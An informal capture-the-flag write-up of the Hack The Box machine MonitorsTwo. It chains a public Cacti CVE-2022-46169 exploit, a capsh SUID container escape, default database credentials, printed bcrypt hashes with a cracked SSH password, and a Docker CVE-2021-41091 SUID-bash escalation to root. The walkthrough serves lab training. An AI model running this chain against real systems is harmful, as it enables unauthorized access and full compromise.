i start the machine with a classic NMAP scan:
	
	nmap -sC -sV -p- 10.10.11.211 
output:
	
	22/tcp open  ssh
	80/tcp open  http
i start taking a look at the webserver on port 80

is a simple login page of "Cacti group",
searching online i found a possible exploit:
	
	https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit
i run the script and submit all the data from the web serevr and my ip and port,
and i get a shell as www-data (EZ).
so i keep on going with enumeration because it is probably going to be
a docker container beacuse there are
no users...

so i upload linpeas on the machine and run it:
	
	is a docker container
I found out that there is a /sbin/capsh SUID vulnerability that i can abuse to get root on the container,
in this post i found a possible exploit:
	
	https://www.bughunter.me/ctf-write-ups/hackthebox-monitortwo-write-up/
exploit:
	
	/sbin/capsh --gid=0 --uid=0 --	
so now we are root in the container GREAT!! right??
actually for now i was a little bit sceptic but kept going because i didn't find much...
P.S. after a while i comed back on this part because maybe we need that for later =)

in /etc/hosts i found this other host that is probably going to be 
the other container:
	
	172.19.0.3      50bca5e748b0
also in the entrypoint.sh we see a file refering to a database thath we found
creds for:
	
	host=db
	user=root
	password=root
so we can try connect from the remote host and see what's there:
	
	mysql --host=db  --user=root --password=root
WE ARE IN!
now we can enumerate the database, in cacti i found some creds in user_auth:
	
	marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
	admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
	guest    | 43e9a4ab75570f5b
i could crack marcus password:
	
	marcus:funkymonkey
so we can now log in the actual machine and not just a container;
even if we could get root in that container by 
chown =(

so now we can log with pwncat via ssh:
	
	python3 -m pwncat
	connect  ssh://marcus:funkymonkey@10.10.11.211:22
and we are inside marcus home where we can submit our first flag

and keep going with the enumeration;

in marcus home directory we found some odds docker file,
so i tried to check docker version to see if maybe it is vulnerable:
	
	docker --version
output:
	
	Docker version 20.10.5+dfsg1, build 55c4c88
i checked online for exploits and i found this:
	
	https://github.com/UncleJ4ck/CVE-2021-41091
is a CVE that makes u run root by executing code inside a container
and WE HAVE A CONTAINER WHERE WE ARE ROOT (see line 23)

so insiede that docker container we need to run this command as root:
	
	chmod u+s /bin/bash
then we need to go back on our local machine and upload the payload that we find in the github repo (i used
pwncat to upload the file):
	
	Ctrl + d
	upload CVE-2021-41091/exp.sh /tmp/exp.sh
	Ctrl + d
	cd /tmp
	chmod +x exp.sh
	./exp.sh -yes
now we have binded a directory where we have a /bin/bash with SUID on, we can try cd there
and execute the file as the output of the exploit says:
	
	cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
	./bin/bash -p
output:
	
	(remote) root@monitorstwo
SO WE ARE FINALLY ROOT!!!
and we can submit the last flag





